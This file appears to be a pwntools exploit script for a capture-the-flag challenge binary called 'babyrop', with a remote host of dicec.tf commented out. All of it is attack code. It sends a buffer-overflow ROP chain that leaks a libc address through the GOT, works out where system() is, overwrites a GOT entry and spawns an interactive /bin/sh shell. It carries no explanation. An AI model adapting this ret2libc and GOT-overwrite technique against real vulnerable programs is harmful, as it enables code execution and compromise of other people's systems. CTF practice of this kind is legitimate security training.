from pwn import *

elf = ELF('./babyrop')
target = process(elf.path)
#target = remote('dicec.tf', 31924)
#context.log_level = "DEBUG"

popRsiR15 = p64(0x00000000004011d1)
popRdi = p64(0x00000000004011d3)
ret = p64(0x000000000040116b)



#'''
target.recvuntil(": ")
newrbp = p64(elf.got['write'] + 0x40 - 8)
payload = "A"*0x40 + newrbp + popRsiR15 + p64(elf.got['gets'])*2 + popRdi + p64(1) + p64(elf.plt['write'])
payload += popRdi + p64(elf.got['write'] - 1) + p64(elf.plt['gets'])*2

gdb.attach(target, 'b *' + hex(elf.plt['write']))

target.sendline(payload)

libc_leak = u64(target.recv(8))
log.info("[LEAK] " + hex(libc_leak))
libc_system = libc_leak - 0x30c40

target.sendline("A/bin/sh\x00" + p64(libc_system))
#target.sendline("A/bin/sh\x00" + ret + p64(libc_system))

target.interactive()
#'''
